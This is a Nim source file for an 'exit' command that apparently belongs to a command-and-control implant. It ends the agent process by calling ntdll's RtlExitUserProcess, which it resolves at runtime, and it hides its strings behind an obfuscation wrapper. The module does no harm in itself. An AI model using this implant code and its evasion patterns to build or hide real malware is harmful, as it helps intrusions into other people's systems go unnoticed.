import ../common/[types, utils]

# Define function prototype
proc executeExit(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let commands* = @[
        Command(
            name: protect("exit"),
            commandType: CMD_EXIT,
            description: protect("Exit the agent process."),
            example: protect("exit"),
            arguments: @[
            ],
            execute: executeExit
        )
    ] 

# Implement execution functions
when not defined(agent):
    proc executeExit(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import winim/lean 
    import strutils, strformat
    import ../agent/utils/io
    import ../agent/protocol/result
    import ../common/[utils, serialize]
    
    type 
        RtlExitUserThread = proc(exitStatus: NTSTATUS): VOID {.stdcall.}
        RtlExitUserProcess = proc(exitStatus: NTSTATUS): VOID {.stdcall.}

    proc executeExit(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let 
                hNtdll = GetModuleHandleA(protect("ntdll"))
                pRtlExitUserThread = cast[RtlExitUserThread](GetProcAddress(hNtdll, protect("RtlExitUserThread")))
                pRtlExitUserProcess = cast[RtlExitUserProcess](GetProcAddress(hNtdll, protect("RtlExitUserProcess")))

            print "   [>] Exiting."
            pRtlExitUserProcess(STATUS_SUCCESS)

        except CatchableError as err:
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))